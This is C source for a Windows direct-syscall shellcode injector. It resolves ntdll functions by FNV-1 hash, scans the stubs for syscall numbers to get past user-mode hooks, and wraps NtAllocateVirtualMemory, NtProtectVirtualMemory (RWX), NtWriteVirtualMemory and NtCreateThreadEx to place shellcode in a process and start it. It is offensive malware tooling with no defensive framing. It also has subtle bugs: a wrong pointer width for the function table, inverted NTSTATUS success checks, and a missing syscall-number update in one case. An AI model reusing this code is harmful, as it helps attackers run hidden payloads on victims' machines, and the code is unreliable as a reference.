#include <stdio.h>
#include <windows.h>
#include <stdarg.h>

#include "error.h"
#include "direct_syscall.h"

// Quick and dirty hash function.
DWORD64 fnv1(PBYTE data) {
    DWORD dwhash = 2166136261U; 
    while (*data) {                   
        dwhash *= 16777619;             
        dwhash ^= *data;                
        data++;                      
    }
    return dwhash;
}

BOOL GetPebImageExportDirectory(IN PVOID pModuleBase, OUT PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        handleError(ERROR_INVALID_MODULE, "Invalid DOS Signature");
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        handleError(ERROR_INVALID_MODULE, "Invalid NT Signature");
        return FALSE;
    }

    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    return TRUE;
}

BOOL GetNtTableEntry(IN PVOID pModuleBase, IN PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, IN pNtTableEntry pNtTableEntry){

    // Fetch Func, Name, Ordinal from PEB Export Table.
    PWORD pdwAddressOfFunctions = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[i]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];

		if (fnv1((PBYTE)pczFunctionName) == pNtTableEntry->dwHash) {
			pNtTableEntry->pAddress = pFunctionAddress;

            WORD j = 0;
			while (TRUE) {
                // Check for ret
				if (*((PBYTE)pFunctionAddress + j) == 0x0f && *((PBYTE)pFunctionAddress + j + 1) == 0x05)
					return FALSE;
				if (*((PBYTE)pFunctionAddress + j) == 0xc3)
					return FALSE;

				// First opcodes should be : incrament if hooked.
				//    MOV R10, Ri
				//    MOV Ri, <syscall>
				if (*((PBYTE)pFunctionAddress + j) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + j) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + j) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + j) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + j) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + j) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + j);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + j);
                    // Rotate offset to get the syscall number.
					pNtTableEntry->wSyscall = (high << 8) | low;
                    // Multiply by 256 and add the low byte for same result.
                    // pNtTableEntry->wSyscall = (high * 256) + low;
					break;
				}

				j++;
			};
		}
	}


    return TRUE;
}

BOOL initiateDirectSyscallTable(void){

    return TRUE;
}

BOOL runDirectSyscall(IN pNtTable pNtTable, IN enum DirectSyscallLibrary DirectSyscallLibrary, ...) {

    // Sort and init the arguments.
    va_list args;
    NTSTATUS STATUS;
    HANDLE hProcess;
    PVOID pShellcodeBaseAddress;
    PBYTE pShellcodeBuffer;
    DWORD dwShellcodeBufferSize;
    SIZE_T sNumberOfBytesWritten;
    DWORD dwOldProtection;


    switch (DirectSyscallLibrary)
    {
    case SysNtAllocateVirtualMemory:

        va_start(args, DirectSyscallLibrary);
        hProcess = va_arg(args, HANDLE);
        dwShellcodeBufferSize = va_arg(args, DWORD);
        va_end(args);


        DirectSysCallUpdate(pNtTable->NtAllocateVirtualMemory.wSyscall);
        if (!(STATUS = DirectSysCall(hProcess, NULL, dwShellcodeBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
            handleError(ERROR_INVALID_ARGUMENTS, "Failed to call NtAllocateVirtualMemory");
            return FALSE;
        }
        break;
    case SysNtProtectVirtualMemory:

        va_start(args, DirectSyscallLibrary);
        hProcess = va_arg(args, HANDLE);
        pShellcodeBaseAddress = va_arg(args, PVOID);
        dwShellcodeBufferSize = va_arg(args, DWORD);
        va_end(args);

        DirectSysCallUpdate(pNtTable->NtProtectVitualMemory.wSyscall);
        if (!(STATUS = DirectSysCall(hProcess, pShellcodeBaseAddress, dwShellcodeBufferSize, 0x40, &dwOldProtection))) {
            handleError(ERROR_INVALID_ARGUMENTS, "Failed to call NtProtectVirtualMemory");
            return FALSE;
        }
        break;
    case SysNtCreateThreadEx:

        va_start(args, DirectSyscallLibrary);
        hProcess = va_arg(args, HANDLE);
        pShellcodeBaseAddress = va_arg(args, PVOID);
        va_end(args);

        DirectSysCallUpdate(pNtTable->NtCreateThreadEx.wSyscall);
        if (! (STATUS = DirectSysCall(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeBaseAddress, NULL, 0, NULL, NULL))) {
            handleError(ERROR_INVALID_ARGUMENTS, "Failed to call NtCreateThreadEx");
            return FALSE;
        }
        break;

    case SysNtWriteVirtualMemory:

        va_start(args, DirectSyscallLibrary);
        hProcess = va_arg(args, HANDLE);
        pShellcodeBaseAddress = va_arg(args, PVOID);
        pShellcodeBuffer = va_arg(args, PBYTE);
        dwShellcodeBufferSize = va_arg(args, DWORD);
        va_end(args);

        STATUS = DirectSysCall(hProcess, pShellcodeBaseAddress, pShellcodeBuffer, dwShellcodeBufferSize, &sNumberOfBytesWritten);
        if (!(NT_SUCCESS(STATUS) && dwShellcodeBufferSize == sNumberOfBytesWritten)) {
            handleError(ERROR_INVALID_ARGUMENTS, "Failed to call DirectSysCall or buffer size mismatch");
            return FALSE;
        }

        break;
    default:
        handleError(ERROR_INVALID_ARGUMENTS, "Invalid DirectSyscallLibrary");
        break;
    }

    return TRUE;
}
